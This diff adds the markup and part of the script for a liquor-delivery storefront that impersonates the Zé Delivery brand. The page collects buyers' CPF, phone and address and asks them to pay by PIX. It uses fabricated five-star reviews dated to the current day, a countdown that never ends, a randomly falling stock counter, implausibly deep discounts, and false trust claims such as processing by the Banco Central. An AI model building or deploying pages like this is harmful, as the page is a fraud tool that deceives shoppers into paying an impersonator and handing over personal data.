+<!-- ── CART OVERLAY + DRAWER ──────────────────────────────────── -->
+<div class="cart-overlay" id="cartOverlay" onclick="closeCart()"></div>
+<div class="cart-drawer" id="cartDrawer">
+  <div class="cart-handle"></div>
+  <div class="cart-drawer-head">
+    <h3>🛒 Meu Pedido</h3>
+    <button class="cart-close" onclick="closeCart()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="cart-items" id="cartItems">
+    <div class="cart-empty" id="cartEmpty">
+      <i class="fas fa-shopping-basket"></i>
+      <p>Seu carrinho está vazio</p>
+      <p style="font-size:12px;margin-top:4px;">Adicione produtos para continuar</p>
+    </div>
+  </div>
+  <div class="cart-footer">
+    <div class="cart-summary">
+      <div class="cart-summary-row">
+        <span>Subtotal</span><span id="cartSubtotal">R$ 0,00</span>
+      </div>
+      <div class="cart-summary-row">
+        <span>Entrega</span>
+        <span style="color:var(--green);font-weight:800;">Grátis</span>
+      </div>
+      <div class="cart-summary-row total">
+        <span>Total</span><span id="cartTotal">R$ 0,00</span>
+      </div>
+    </div>
+    <div class="min-order-warn" id="minOrderWarn">⚠️ Pedido mínimo: R$ 21,49</div>
+    <button class="btn-checkout" id="btnCheckout" onclick="goCheckout()">
+      Confirme os dados e endereço →
+    </button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!-- CHECKOUT MODAL -->
+<div class="ck-overlay" id="ckOverlay">
+  <div class="ck-modal" id="ckModal">
+
+    <div class="ck-header">
+      <button class="ck-close" onclick="closeCheckout()"><i class="fas fa-times"></i></button>
+      <h2 id="ckTitle">Finalizar Pedido</h2>
+    </div>
+
+    <div class="ck-body">
+
+      <!-- Trust bar -->
+      <div class="ck-trust">
+        <div class="ck-trust-item"><i class="fas fa-lock"></i> Compra 100% segura</div>
+        <div class="ck-trust-item"><i class="fas fa-shield-alt"></i> Dados protegidos</div>
+        <div class="ck-trust-item"><i class="fas fa-bolt"></i> PIX instantâneo</div>
+      </div>
+
+      <!-- Resumo do pedido -->
+      <div class="ck-order-summary">
+        <div class="ck-order-title">📦 Resumo do Pedido</div>
+        <div id="ckOrderItems"></div>
+        <div class="ck-order-total">
+          <span>Total a pagar</span>
+          <span id="ckOrderTotal">R$ 0,00 <span class="ck-pix-badge">PIX</span></span>
+        </div>
+      </div>
+
+      <!-- FORM -->
+      <div class="checkout-form-area" id="checkoutFormArea">
+
+        <div class="ck-section-label">👤 Seus dados</div>
+
+        <div class="ck-field">
+          <label>Nome completo *</label>
+          <input type="text" id="ckNome" placeholder="Ex: João Silva" autocomplete="name">
+        </div>
+
+        <div class="ck-row2">
+          <div class="ck-field">
+            <label>CPF *</label>
+            <input type="tel" id="ckCpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+          </div>
+          <div class="ck-field">
+            <label>WhatsApp *</label>
+            <input type="tel" id="ckTel" placeholder="(11) 99999-9999" maxlength="15" inputmode="numeric">
+          </div>
+        </div>
+
+        <div class="ck-section-label">📍 Endereço de entrega</div>
+
+        <div class="ck-field ck-cep-wrap">
+          <label>CEP *</label>
+          <input type="tel" id="ckCep" placeholder="00000-000" maxlength="9" inputmode="numeric"
+            oninput="onCepInput(this)">
+          <div class="ck-cep-spinner" id="cepSpinner"></div>
+          <div class="ck-hint">Digite o CEP para preencher o endereço automaticamente</div>
+        </div>
+
+        <div class="ck-field">
+          <label>Rua / Logradouro</label>
+          <input type="text" id="ckRua" placeholder="Preenchido pelo CEP" readonly>
+        </div>
+
+        <div class="ck-row2">
+          <div class="ck-field">
+            <label>Número *</label>
+            <input type="tel" id="ckNumero" placeholder="Ex: 123" inputmode="numeric">
+          </div>
+          <div class="ck-field">
+            <label>Complemento</label>
+            <input type="text" id="ckCompl" placeholder="Apto, bloco...">
+          </div>
+        </div>
+
+        <div class="ck-row2">
+          <div class="ck-field">
+            <label>Bairro</label>
+            <input type="text" id="ckBairro" placeholder="Preenchido pelo CEP" readonly>
+          </div>
+          <div class="ck-field">
+            <label>Cidade / UF</label>
+            <input type="text" id="ckCidadeUF" placeholder="Cidade, UF" readonly>
+          </div>
+        </div>
+
+        <button class="btn-gerar-pix" id="btnGerarPix" onclick="gerarPix()">
+          <span class="pix-icon">🔑</span> Gerar PIX e Confirmar Pedido
+        </button>
+        <div class="ck-security-note">
+          <i class="fas fa-lock"></i> Seus dados são criptografados e protegidos
+        </div>
+
+      </div><!-- /checkout-form-area -->
+
+      <!-- TELA PIX -->
+      <div class="pix-screen" id="pixScreen">
+
+        <div class="pix-header-banner">
+          <h3>PIX gerado com sucesso!</h3>
+          <p>Escaneie o QR Code ou copie o código abaixo</p>
+        </div>
+
+        <div class="pix-value-box">
+          <div class="pv-label">Valor total do pedido</div>
+          <div class="pv-amount" id="pixValorDisplay">R$ 0,00</div>
+          <div class="pv-items" id="pixItensDisplay"></div>
+        </div>
+
+        <div class="pix-expire-bar">
+          <i class="fas fa-clock"></i>
+          PIX expira em <span id="pixExpireMin">10:00</span>
+        </div>
+
+        <div class="pix-status-bar">
+          <div class="psb-icon">⏳</div>
+          <div class="psb-text">
+            <strong>Aguardando pagamento...</strong>
+            <span>Assim que confirmarmos, seu pedido é processado na hora e o quanto antes sairá para entrega</span>
+          </div>
+        </div>
+
+        <div class="pix-qr-wrap" id="pixQrWrap">
+          <div class="pix-qr-placeholder">
+            <i class="fas fa-qrcode" style="font-size:40px;opacity:.2;"></i>
+            <span>QR Code</span>
+          </div>
+        </div>
+
+        <div class="pix-copy-box">
+          <div class="pcb-label">📋 Código PIX Copia e Cola</div>
+          <div class="pcb-code" id="pixCodigoCola">Gerando código...</div>
+        </div>
+
+        <button class="btn-copy-pix" id="btnCopyPix" onclick="copyPix()">
+          <i class="fas fa-copy"></i> Copiar código PIX
+        </button>
+
+        <div class="pix-trust-row">
+          <div class="pix-trust-item"><i class="fas fa-shield-alt"></i> Ambiente seguro</div>
+          <div class="pix-trust-item"><i class="fas fa-university"></i> Processado pelo Banco Central</div>
+          <div class="pix-trust-item"><i class="fas fa-bolt"></i> Confirmação instantânea</div>
+        </div>
+
+        <div class="ze-promo-box">
+          <img src="images/zelogo.png" alt="Zé Delivery">
+          <div class="ze-promo-text">
+            <strong>Zé Delivery — Entrega oficial</strong>
+            <span>Após o pagamento, seu pedido é confirmado e a entrega começa em instantes. Tempo estimado: 15–45 min.</span>
+          </div>
+        </div>
+
+      </div><!-- /pix-screen -->
+
+      <!-- TELA SUCESSO -->
+      <div class="success-screen" id="successScreen">
+        <div class="success-icon">✅</div>
+        <h2>Pagamento confirmado! 🎉</h2>
+        <p>Seu PIX foi recebido com sucesso!<br>Seu pedido já está sendo preparado.</p>
+
+        <div class="success-delivery-card">
+          <div class="sdc-row">
+            <i class="fas fa-motorcycle"></i>
+            <span>Entregador a caminho — <strong>15 a 45 minutos</strong></span>
+          </div>
+          <div class="sdc-row">
+            <i class="fas fa-map-marker-alt"></i>
+            <span>Entregando no endereço informado</span>
+          </div>
+          <div class="sdc-row">
+            <i class="fas fa-phone"></i>
+            <span>Fique de olho no <strong>WhatsApp</strong> para rastreio</span>
+          </div>
+          <div class="sdc-row">
+            <i class="fas fa-box"></i>
+            <span>Pedido: <strong id="successOrderId"></strong></span>
+          </div>
+        </div>
+
+        <div class="success-ze-banner">
+          <div class="szb-emoji">🟡</div>
+          <p>Fique de olho nas nossas promoções no app após essa compra! O Zé Delivery agradece! 🍺</p>
+        </div>
+      </div>
+
+    </div><!-- /ck-body -->
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- PAGE -->
+<div class="page">
+
+  <div class="banner-promo">
+    🔥 PROMOÇÃO RELÂMPAGO — <span>Só hoje! Até 67% OFF em bebidas selecionadas</span>
+  </div>
+
+  <header class="store-header">
+    <div class="cover-img">
+      <img src="images/hm.png" alt="Banner Zé Delivery">
+      <div class="logo-wrap" id="logoWrap">
+        <img src="images/zelogo.png" alt="Zé Delivery">
+      </div>
+    </div>
+
+    <div class="store-info-card">
+      <div class="store-name">
+        Zé Delivery
+        <i class="fas fa-circle-check verified"></i>
+      </div>
+      <div class="store-rating">
+        <span class="stars">★★★★★</span>
+        <strong>4,9</strong>
+        <span class="count">(71.368 avaliações em 2026)</span>
+      </div>
+      <div class="store-divider"></div>
+      <div class="store-meta">
+        <div class="pill green"><i class="fas fa-motorcycle"></i> 15–45 min</div>
+        <div class="pill green"><i class="fas fa-tag"></i> Entrega Grátis</div>
+        <div class="pill yellow"><i class="fas fa-coins"></i> Mín. R$ 21,49</div>
+        <div class="pill"><i class="fas fa-map-marker-alt"></i> <span id="locCity">Sua cidade</span></div>
+      </div>
+      <div class="store-status-row">
+        <div class="dot-pulse"></div>
+        ABERTO AGORA — Até 02:00
+        <i class="fas fa-shield-alt" style="color:var(--green);margin-left:6px;"></i>
+      </div>
+    </div>
+
+    <div class="partner-badge">
+      <div class="badge-icon">🏆</div>
+      <div class="badge-text">
+        <p>Atenção: Fique de olho nas promoções em app após essa compra</p>
+        <p>Promoção de primeiro pedido ativa! Descontos já aplicados.</p>
+      </div>
+    </div>
+
+    <div class="countdown-bar">
+      <div class="cd-label">
+        🔥 Promoção reinicia em
+        <span>Aproveita antes que acabem os estoques!</span>
+      </div>
+      <div>
+        <div class="countdown-digits">
+          <div><div class="cd-box" id="cdMin">00</div><div class="cd-unit">min</div></div>
+          <div class="cd-sep">:</div>
+          <div><div class="cd-box" id="cdSec">00</div><div class="cd-unit">seg</div></div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <nav class="cat-nav">
+    <div class="cat-nav-inner" id="catNav">
+      <button class="cat-btn active" data-target="sec-destaque">⚡ Destaques</button>
+      <button class="cat-btn" data-target="sec-whisky">Whisky</button>
+      <button class="cat-btn" data-target="sec-gin">Gin</button>
+      <button class="cat-btn" data-target="sec-cerveja">Cerveja</button>
+      <button class="cat-btn" data-target="sec-combos">Combos</button>
+      <button class="cat-btn" data-target="sec-energetico">Energéticos</button>
+      <button class="cat-btn" data-target="sec-avaliacoes">⭐ Avaliações</button>
+    </div>
+  </nav>
+
+  <main class="pb-cart">
+
+    <!-- DESTAQUES -->
+    <section class="section" id="sec-destaque">
+      <div class="section-head">
+        <h2>🔥 Destaques — Mais Vendidos</h2>
+        <p>Os produtos mais pedidos das últimas horas</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card flash" onclick="void(0)">
+          <div class="prod-info">
+            <div class="prod-badges">
+              <span class="badge flash-b">PROMO TOMA JACK!</span>
+              <span class="badge off">67% OFF</span>
+            </div>
+            <div class="prod-name">Combo Jack Daniel's</div>
+            <div class="prod-desc">Whisky Jack Daniel's + 4 Gelos Saborizados + 4 Energéticos para você e a galera!</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 76,47</span>
+              <span class="prod-price-old">R$ 299,90</span>
+              <span class="prod-off-pct">-67%</span>
+            </div>
+            <div class="prod-stock">🔥 Apenas <span id="estoqueJack">8</span> combos restantes!</div>
+          </div>
+          <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
+            <div class="prod-img-wrap">
+              <img src="images/jack.png" alt="Combo Jack Daniel's">
+            </div>
+          </div>
+          <button class="btn-add-card" onclick="addToCart(event,'jack','Combo Jack Daniel\'s',76.47)" title="Adicionar">+</button>
+        </div>
+
+        <div class="product-card" onclick="void(0)">
+          <div class="prod-info">
+            <div class="prod-badges">
+              <span class="badge best">🏆 Mais Vendido</span>
+              <span class="badge off">55% OFF</span>
+            </div>
+            <div class="prod-name">Combo Mansão Maromba Whisky</div>
+            <div class="prod-desc">3 garrafas de Whisky Sabor Energético 1L + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/sabor.png" alt="Combo Mansão Maromba Whisky"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'maromba_wh','Combo Mansão Maromba Whisky',24.90)">+</button>
+        </div>
+
+        <div class="product-card" onclick="void(0)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">55% OFF</span></div>
+            <div class="prod-name">Combo Mansão Maromba Gin</div>
+            <div class="prod-desc">3 garrafas de Gin Sabor Energético + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/saborg.png" alt="Combo Mansão Maromba Gin"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'maromba_gin','Combo Mansão Maromba Gin',24.90)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- WHISKY -->
+    <section class="section" id="sec-whisky">
+      <div class="section-head">
+        <h2> Whisky</h2>
+        <p>Seleção premium com os melhores descontos</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">54% OFF</span></div>
+            <div class="prod-name">Combo Red Label</div>
+            <div class="prod-desc">Johnnie Walker Red Label 1L + 2 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 69,90</span>
+              <span class="prod-price-old">R$ 152,00</span>
+              <span class="prod-off-pct">-54%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/red.png" alt="Combo Red Label"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'red_label','Combo Red Label',69.90)">+</button>
+        </div>
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">🏆 Premium</span><span class="badge off">48% OFF</span></div>
+            <div class="prod-name">Combo Black Label</div>
+            <div class="prod-desc">Johnnie Walker Black Label 1L + 4 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 119,90</span>
+              <span class="prod-price-old">R$ 230,00</span>
+              <span class="prod-off-pct">-48%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/black.png" alt="Combo Black Label"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'black_label','Combo Black Label',119.90)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- GIN -->
+    <section class="section" id="sec-gin">
+      <div class="section-head">
+        <h2> Gin</h2>
+        <p>Rótulos selecionados para os amantes de gin</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">60% OFF</span></div>
+            <div class="prod-name">Kit Gin Beefeater</div>
+            <div class="prod-desc">Beefeater London Dry Gin 750ml + tônica + limão</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 48,61</span>
+              <span class="prod-price-old">R$ 133,50</span>
+              <span class="prod-off-pct">-60%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/beef.png" alt="Kit Gin Beefeater"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'gin_beef','Kit Gin Beefeater',48,61)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- CERVEJA -->
+    <section class="section" id="sec-cerveja">
+      <div class="section-head">
+        <h2> Cerveja</h2>
+        <p>Fardos gelados entregues até você</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">Popular</span></div>
+            <div class="prod-name">Fardo de Heineken</div>
+            <div class="prod-desc">Fardo com 12 unidades de 474ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 33,72</span>
+              <span class="prod-price-old">R$ 94,99</span>
+              <span class="prod-off-pct">-64%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/hein.png" alt="Fardo Heineken"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'heineken','Fardo Heineken 12x474ml',33.72)">+</button>
+        </div>
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">72% OFF</span></div>
+            <div class="prod-name">Fardo de Budweiser</div>
+            <div class="prod-desc">Fardo com 12 unidades de 474ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 21,49</span>
+              <span class="prod-price-old">R$ 75,90</span>
+              <span class="prod-off-pct">-72%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/bud.png" alt="Fardo Budweiser"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'budweiser','Fardo Budweiser 12x474ml',21.49)">+</button>
+        </div>
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"></div>
+            <div class="prod-name">Fardo de Corona</div>
+            <div class="prod-desc">Fardo com 24 unidades de 330ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 62,82</span>
+              <span class="prod-price-old">R$ 119,90</span>
+              <span class="prod-off-pct">-48%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/corona.png" alt="Fardo Corona"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'corona','Fardo Corona 24x330ml',62.82)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- COMBOS -->
+    <section class="section" id="sec-combos">
+      <div class="section-head">
+        <h2> Combos</h2>
+        <p>Monte seu kit ideal para a galera</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">53% OFF</span></div>
+            <div class="prod-name">Fardo de Beats Senses</div>
+            <div class="prod-desc">Fardo com 8 unidades de 269ml — sabores variados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 25,63</span>
+              <span class="prod-price-old">R$ 48,60</span>
+              <span class="prod-off-pct">-53%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/beats.png" alt="Fardo Beats Senses"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'beats','Fardo Beats Senses 8x269ml',25.63)">+</button>
+        </div>
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">Popular</span><span class="badge off">55% OFF</span></div>
+            <div class="prod-name">Combo Mansão Maromba Whisky</div>
+            <div class="prod-desc">3 garrafas de Whisky Sabor Energético 1L + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/sabor.png" alt="Combo Maromba Whisky"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'combo_wh2','Combo Mansão Maromba Whisky',24.90)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ENERGÉTICOS -->
+    <section class="section" id="sec-energetico">
+      <div class="section-head">
+        <h2> Energéticos</h2>
+        <p>Turbine qualquer combo com energia</p>
+      </div>
+      <div class="product-list">
+        <div class="product-card">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge new">Novo</span></div>
+            <div class="prod-name">Pack Energético 6 unidades</div>
+            <div class="prod-desc">6 latas energético 250ml — sabor original</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 38,90</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/bull.png" alt="Pack Energético"></div>
+          <button class="btn-add-card" onclick="addToCart(event,'energetico','Pack Energético 6x250ml',38.90)">+</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- AVALIAÇÕES -->
+    <section class="section reviews-section" id="sec-avaliacoes">
+      <div class="reviews-header">
+        <div class="reviews-score">
+          <div class="score-num">4,9</div>
+          <div class="score-stars">★★★★★</div>
+        </div>
+        <div class="reviews-meta">
+          <p>71.368 avaliações</p>
+          <small>8.546 avaliações nos últimos 30 dias</small>
+        </div>
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">T</div>
+        <div class="review-body">
+          <span class="review-name">Thales</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate1"></span>
+          <p class="review-text">O site é de fato o oficial da empresa. Não demorou muito para chegar, veio muito bem embalado. Produtos originais, com lacres originais. Pode comprar! 👍</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-01-57-52.jpg" alt="" onerror="this.style.display='none'">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">F</div>
+        <div class="review-body">
+          <span class="review-name">Fernando</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate2"></span>
+          <p class="review-text">Sempre muito bem embalado e a entrega muito rápida. Produto original, podem comprar! Zé Delivery é confiança e qualidade!</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-01-58-38.jpg" alt="" onerror="this.style.display='none'">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">K</div>
+        <div class="review-body">
+          <span class="review-name">Karol</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate3"></span>
+          <p class="review-text">Sou viciada em comprar pelo app e agora pelo site pq aqui tem muito mais promoção boa! Sempre produtos originais, com selo e lacrados 😍</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-03-00.jpg" alt="" onerror="this.style.display='none'">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">M</div>
+        <div class="review-body">
+          <span class="review-name">Marcos</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate4"></span>
+          <p class="review-text">Tenho o app mas sempre fico atento aqui no site pq tem mais promoção boa! Esse é meu segredo 🤫 Maravilhoso e original, entrega rápida do Zé Delivery 🔥</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-04-34.jpg" alt="" onerror="this.style.display='none'">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">G</div>
+        <div class="review-body">
+          <span class="review-name">Gustavo</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate5"></span>
+          <p class="review-text">Já comprei outras vezes pelo app. Caixa super bem embalada! O entregador super cuidadoso. Sem dano nenhum! Pra quem tem dúvida: o site é realmente oficial! 🙏</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-01-36.jpg" alt="" onerror="this.style.display='none'">
+      </div>
+    </section>
+
+    <footer class="footer-info">
+      <strong>Zé Delivery</strong><br>
+      © <span id="anoFooter"></span> — Todos os direitos reservados.<br>
+      Venda e entrega exclusiva para maiores de 18 anos.<br>
+      Beba com moderação.
+    </footer>
+  </main>
+
+  <!-- BARRA DO CARRINHO -->
+  <div class="cart-bar" id="cartBar">
+    <button class="cart-bar-btn" onclick="openCart()">
+      <div class="cb-left">
+        <span class="cart-count-badge" id="cartCountBadge">0</span>
+        Ver meu pedido 🛒
+      </div>
+      <span class="cb-total" id="cartBarTotal">R$ 0,00</span>
+    </button>
+  </div>
+
+</div><!-- /page -->
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<script>
+  /* ── Estado ─────────────────────────────────────────────── */
+  const cart = {};
+  const MIN_ORDER = 21.49;
+  let pixTxnId    = null;
+  let pixPolling  = null;
+  let pixExpTimer = null;
+  let pixCode     = '';
+
+  /* ── Localização ─────────────────────────────────────────── */
+  async function getCityFromCoords(lat, lon) {
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=pt-BR`);
+    const d = await r.json();
+    const city = d.address.city || d.address.town || d.address.village || d.address.suburb || '';
+    const state = d.address.state_code || d.address.state || '';
+    return { city, state };
+  }
+
+  async function getCityFromIP() {
+    const apis = [
+      async () => {
+        const r = await fetch('https://ipwho.is/');
+        const d = await r.json();
+        if (!d.success || !d.city) throw new Error();
+        return { city: d.city, state: d.region_code || '' };
+      },
+      async () => {
+        const r = await fetch('https://freeipapi.com/api/json');
+        const d = await r.json();
+        if (!d.cityName || d.cityName === '-') throw new Error();
+        return { city: d.cityName, state: d.regionCode || '' };
+      }
+    ];
+    for (const api of apis) {
+      try { return await api(); } catch {}
+    }
+    throw new Error('IP APIs falharam');
+  }
+
+  function setLocationUI(city, state) {
+    const label = city + (state ? `, ${state}` : '');
+    document.getElementById('locCityName').textContent = label;
+    document.getElementById('locCity').textContent = city;
+  }
+
+  async function detectLocation() {
+    // Tenta geolocalização real do browser primeiro
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try {
+            const { city, state } = await getCityFromCoords(pos.coords.latitude, pos.coords.longitude);
+            if (city) { setLocationUI(city, state); return; }
+          } catch {}
+          // Se Nominatim falhar, cai no IP
+          try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {}
+        },
+        async () => {
+          // Usuário negou permissão — usa IP
+          try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {
+            document.getElementById('locCityName').textContent = 'Sua Cidade';
+          }
+        },
+        { timeout: 6000 }
+      );
+    } else {
+      // Browser sem suporte — usa IP
+      try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {
+        document.getElementById('locCityName').textContent = 'Sua Cidade';
+      }
+    }
+  }
+  detectLocation();
+
+  function confirmLocation() {
+    document.getElementById('locOverlay').style.display = 'none';
+  }
+
+  /* ── Countdown promo ─────────────────────────────────────── */
+  let cdEnd = Date.now() + (22 * 60 + 37) * 1000;
+  function updateCd() {
+    const left = Math.max(0, cdEnd - Date.now());
+    const m = Math.floor(left / 60000);
+    const s = Math.floor((left % 60000) / 1000);
+    document.getElementById('cdMin').textContent = String(m).padStart(2,'0');
+    document.getElementById('cdSec').textContent = String(s).padStart(2,'0');
+    if (left === 0) cdEnd = Date.now() + 25 * 60 * 1000;
+  }
+  updateCd();
+  setInterval(updateCd, 1000);
+
+  let jackStock = 8;
+  setInterval(() => {
+    if (jackStock > 2 && Math.random() < .15) {
+      jackStock--;
+      const el = document.getElementById('estoqueJack');
+      if (el) el.textContent = jackStock;
+    }
+  }, 8000);
+
+  /* ── Datas avaliações ────────────────────────────────────── */
+  function today() {
+    const d = new Date();
+    return `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()}`;
+  }
+  ['rDate1','rDate2','rDate3','rDate4','rDate5'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = '  •  ' + today();
+  });
+  document.getElementById('anoFooter').textContent = new Date().getFullYear();
+
+  /* ── Categorias nav ──────────────────────────────────────── */
+  const catBtns = document.querySelectorAll('.cat-btn');
+  catBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      catBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const target = document.getElementById(btn.dataset.target);
+      if (target) {
+        const top = target.getBoundingClientRect().top + window.scrollY - 52;
+        window.scrollTo({ top, behavior: 'smooth' });
+      }
+    });
+  });
+  const sections = Array.from(document.querySelectorAll('section[id]'));
+  window.addEventListener('scroll', () => {
+    const y = window.scrollY + 80;
+    sections.forEach(sec => {
+      if (sec.offsetTop <= y && sec.offsetTop + sec.offsetHeight > y) {
+        catBtns.forEach(b => b.classList.remove('active'));
+        const active = document.querySelector(`.cat-btn[data-target="${sec.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { passive: true });
+
+  /* ── Formatação ──────────────────────────────────────────── */
+  function fmt(val) { return 'R$ ' + val.toFixed(2).replace('.',','); }
+  function fmtCpf(v) { return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2'); }
+  function fmtTel(v) { return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').slice(0,15); }
+  function fmtCep(v) { return v.replace(/\D/g,'').replace(/(\d{5})(\d)/,'$1-$2').slice(0,9); }
+
+  /* ── Carrinho ────────────────────────────────────────────── */
+  function addToCart(e, id, name, price) {
+    if (e && e.stopPropagation) e.stopPropagation();
+    if (!cart[id]) cart[id] = { name, price, qty: 0 };
+    cart[id].qty++;
+    renderCart();
+    showToast(`${name} adicionado! 🍺`);
+    if (typeof fbq !== 'undefined') fbq('track', 'AddToCart', { value: price, currency: 'BRL', content_name: name });
+  }
+
+  function changeQty(e, id, delta) {
+    if (e) e.stopPropagation();
+    if (!cart[id]) return;
+    cart[id].qty = Math.max(0, cart[id].qty + delta);
+    if (cart[id].qty === 0) delete cart[id];
+    renderCart();
+  }
+
+  function renderCart() {
+    const ids = Object.keys(cart);
+    const total = ids.reduce((s, k) => s + cart[k].price * cart[k].qty, 0);
+    const count = ids.reduce((s, k) => s + cart[k].qty, 0);
+    const bar = document.getElementById('cartBar');
+    bar.style.display = count > 0 ? 'block' : 'none';
+    document.getElementById('cartCountBadge').textContent = count;
+    document.getElementById('cartBarTotal').textContent = fmt(total);
+    document.getElementById('cartSubtotal').textContent = fmt(total);
+    document.getElementById('cartTotal').textContent = fmt(total);
+    const warn = document.getElementById('minOrderWarn');
+    warn.style.display = (count > 0 && total < MIN_ORDER) ? 'block' : 'none';
+    const container = document.getElementById('cartItems');
+    const empty = document.getElementById('cartEmpty');
+    if (ids.length === 0) {
+      empty.style.display = 'block';
+      container.querySelectorAll('.cart-item').forEach(el => el.remove());
+      return;
+    }
+    empty.style.display = 'none';
+    container.querySelectorAll('.cart-item').forEach(el => el.remove());
+    ids.forEach(id => {
+      const item = cart[id];
+      const div = document.createElement('div');
+      div.className = 'cart-item';
+      div.innerHTML = `
+        <div class="cart-item-img">🍺</div>
+        <div class="cart-item-info">
+          <div class="cart-item-name">${item.name}</div>
+          <div class="cart-item-price">${fmt(item.price)} cada</div>
+        </div>
